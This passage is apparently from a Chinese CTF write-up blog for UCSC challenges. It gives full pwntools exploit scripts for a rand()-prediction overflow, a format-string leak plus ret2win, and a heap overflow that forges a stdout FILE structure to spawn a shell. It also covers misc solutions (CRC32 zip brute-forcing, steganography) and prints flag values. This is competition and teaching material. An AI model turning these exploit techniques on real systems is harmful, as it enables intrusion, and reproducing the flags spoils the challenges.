punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nshell <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span>script<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">,</span> gdbscript<span class=\"token operator\">=</span>script<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">bunny</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#idx=idx</span>\n\nans<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span>\n\nval<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\npredict<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"./predict\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"100\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        a<span class=\"token operator\">=</span>predict<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#print hex(int(a[1]))</span>\n        val<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nio<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"39.107.58.236\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44590</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#io=process(\"./BoFido\")</span>\n\np<span class=\"token operator\">=</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">20</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span>\nsa<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        p<span class=\"token operator\">=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>val<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\" \"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>val<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\" \"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>val<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n\nshell<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<p>预判exp</p>\n<pre class=\"language-c++\" data-language=\"c++\"><code class=\"language-c++\">#include &lt;stdint.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdbool.h&gt;\n#include &lt;time.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(int argc, char * argv[])&#123;\n        uint8_t dmg;\n\n        for(int i&#x3D;0;i&lt;atoi(argv[1]);i++)&#123;\n                &#x2F;&#x2F;int item &#x3D; rand() % 4;\n                dmg &#x3D; rand() % 255;\n                printf(&quot;%d\\n&quot;, dmg);\n        &#125;\n&#125;</code></pre>\n\n<h3 id=\"userlogin-ucsc\"><a href=\"#userlogin-ucsc\" class=\"headerlink\" title=\"userlogin-ucsc\"></a><strong>userlogin-ucsc</strong></h3><p>登陆普通用户有格式化字符串漏洞，泄漏root密码打ret2win</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">\"INFO\"</span>\ncontext<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"tmux\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"splitw\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-h\"</span><span class=\"token punctuation\">]</span>\n<span class=\"token comment\">#io=process(\"\")</span>\nio<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"39.107.58.236\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">42744</span><span class=\"token punctuation\">)</span>\n\nr <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nrl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>    a<span class=\"token operator\">=</span><span class=\"token boolean\">False</span>        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nru <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token boolean\">True</span>    <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\ns <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsa <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nshell <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span>script<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">,</span> gdbscript<span class=\"token operator\">=</span>script<span class=\"token punctuation\">)</span>\n\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"supersecureuser\"</span><span class=\"token punctuation\">)</span>\nrl<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl<span class=\"token punctuation\">(</span><span class=\"token string\">\"%13$s\"</span><span class=\"token punctuation\">)</span>\nroot<span class=\"token operator\">=</span>rl<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span> root\n\nrop<span class=\"token operator\">=</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">40</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0401276</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0401261</span><span class=\"token punctuation\">)</span>\n\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> root<span class=\"token punctuation\">)</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> rop<span class=\"token punctuation\">)</span>\n\n\nshell<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<h3 id=\"疯狂复制-ucsc\"><a href=\"#疯狂复制-ucsc\" class=\"headerlink\" title=\"疯狂复制-ucsc\"></a><strong>疯狂复制-ucsc</strong></h3><p>edit函数有整数溢出，添负数可以控制stdout和stdin结构题。先塞满0x90的tcache，再释放0x90大小的堆块来让他到unsorted bin，再创在一个堆块来拿到libc泄漏，最后更改stdout打io。</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">\"INFO\"</span>\ncontext<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"tmux\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"splitw\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-h\"</span><span class=\"token punctuation\">]</span>\n<span class=\"token comment\">#io=process(\"./chal\")</span>\nlibc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./libc.so.6\"</span><span class=\"token punctuation\">)</span>\nio<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"39.107.58.236\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">45181</span><span class=\"token punctuation\">)</span>\n\nr <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nrl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>    a<span class=\"token operator\">=</span><span class=\"token boolean\">False</span>        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nru <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token boolean\">True</span>    <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\ns <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsa <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nshell <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span>script<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">,</span> gdbscript<span class=\"token operator\">=</span>script<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"Size\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"4\"</span><span class=\"token punctuation\">)</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">view</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        add<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        free<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span>\nview<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">\": \"</span><span class=\"token punctuation\">)</span>\nlibc<span class=\"token punctuation\">.</span>address<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x3ebd20</span>\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">\"\"\"\nfake_io=flat(&#123;\n        0x0: \" sh;\",\n        0x68: libc.symbols['system'],\n        0x88: libc.sym[\"environ\"]-0x10,\n        0xa0: libc.symbols['_IO_2_1_stdout_'],\n        0xd8: libc.sym[\"_IO_wfile_jumps\"]-0x20,\n        0xe0: libc.symbols['_IO_2_1_stdout_']\n&#125;, filler=\"\\0\")\n\"\"\"</span>\n\nfake_io <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x0</span><span class=\"token punctuation\">:</span> <span class=\"token string\">b'  sh;'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x8</span><span class=\"token punctuation\">:</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x28</span><span class=\"token punctuation\">:</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x68</span><span class=\"token punctuation\">:</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x88</span><span class=\"token punctuation\">:</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_environ'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xa0</span><span class=\"token punctuation\">:</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xd0</span><span class=\"token punctuation\">:</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xd8</span><span class=\"token punctuation\">:</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_wfile_jumps'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> filler<span class=\"token operator\">=</span><span class=\"token string\">b\"\\x00\"</span><span class=\"token punctuation\">)</span>\n\n\nfree<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nfree<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        add<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#debug(\"break *_IO_wdoallocbuf\\nc\")</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> fake_io<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#debug()</span>\nshell<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<h1 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h1><h3 id=\"USB-ucsc\"><a href=\"#USB-ucsc\" class=\"headerlink\" title=\"USB-ucsc\"></a><strong>USB-ucsc</strong></h3><p>CTF-NetA一把梭</p>\n<p><img src=\"/images/1745240699575-12.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>flag{ebdfea9b-3469-41c7-9070-d7833ecc6102}</p>\n<h3 id=\"小套不是套-ucsc\"><a href=\"#小套不是套-ucsc\" class=\"headerlink\" title=\"小套不是套-ucsc\"></a><strong>小套不是套-ucsc</strong></h3><p>对套.zip执行CRC32爆破。</p>\n<p>代码：</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> binascii <span class=\"token keyword\">import</span> crc32\n<span class=\"token keyword\">import</span> string\n<span class=\"token keyword\">import</span> zipfile\ndic<span class=\"token operator\">=</span>string<span class=\"token punctuation\">.</span>printable\n<span class=\"token keyword\">def</span> <span class=\"token function\">CrackCrc</span><span class=\"token punctuation\">(</span>crc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> dic <span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># print (i)</span>\n        <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> dic<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">for</span> p <span class=\"token keyword\">in</span> dic<span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">for</span> q <span class=\"token keyword\">in</span> dic<span class=\"token punctuation\">:</span>\n                    s<span class=\"token operator\">=</span>i<span class=\"token operator\">+</span>j<span class=\"token operator\">+</span>p<span class=\"token operator\">+</span>q\n                    <span class=\"token comment\"># print (crc32(bytes(s,'ascii')) &amp; 0xffffffff)</span>\n                    <span class=\"token keyword\">if</span> crc <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span>crc32<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span><span class=\"token string\">'ascii'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffffffff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                        <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">return</span>\n \n<span class=\"token keyword\">def</span> <span class=\"token function\">getcrc32</span><span class=\"token punctuation\">(</span>fname<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    l<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token builtin\">file</span> <span class=\"token operator\">=</span> fname\n    f <span class=\"token operator\">=</span> zipfile<span class=\"token punctuation\">.</span>ZipFile<span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">global</span> fileList\n    fileList <span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>namelist <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>fileList<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># print (type(fileList))</span>\n    <span class=\"token keyword\">for</span> filename <span class=\"token keyword\">in</span> fileList<span class=\"token punctuation\">:</span>\n        Fileinfo <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>getinfo<span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># print(Fileinfo)</span>\n        crc <span class=\"token operator\">=</span> Fileinfo<span class=\"token punctuation\">.</span>CRC\n        <span class=\"token comment\"># print ('crc',crc)</span>\n        l<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>crc<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> l\n \n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span> <span class=\"token punctuation\">(</span>filename<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    l <span class=\"token operator\">=</span> getcrc32<span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># print(l)</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>fileList<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">'的内容是:'</span><span class=\"token punctuation\">)</span>\n        CrackCrc<span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n \n<span class=\"token keyword\">if</span> __name__  <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    main <span class=\"token punctuation\">(</span><span class=\"token string\">'test.zip'</span><span class=\"token punctuation\">)</span></code></pre>\n\n<p><img src=\"/images/1745240699575-13.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>按照f后面数字的顺序拼接起来，随后cyberchef一把梭：</p>\n<p><img src=\"/images/1745240699575-14.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>另一个压缩包打开之后里面还有一个压缩包，伪加密解出来是一张图：</p>\n<p><img src=\"/images/1745240699575-15.jpeg\" alt=\"img\" loading=\"lazy\"></p>\n<p>010，发现还有一张图。</p>\n<p><img src=\"/images/1745240699575-16.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>补一下png头。能搞出来另外一张图：</p>\n<p><img src=\"/images/1745240699575-17.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>IEDN后面就是oursecret加密的特征</p>\n<p><img src=\"/images/1745240699575-18.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>结合上面的密钥。oursecret解出flag。</p>\n<p><img src=\"/images/1745240699575-19.png\" alt=\"img\" loading=\"lazy\"></p>\n<h3 id=\"three-ucsc\"><a href=\"#three-ucsc\" class=\"headerlink\" title=\"three-ucsc\"></a><strong>three-ucsc</strong></h3><p>part1:8f02d3e7</p>\n<p><img src=\"/images/1745240699575-20.png\" alt=\"img\" loading=\"lazy\"></p>\n<p><img src=\"/images/1745240699575-21.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>part2:-ce89-4d6b-830e-</p>\n<p><img src=\"/images/1745240699575-22.png\" alt=\"img\" 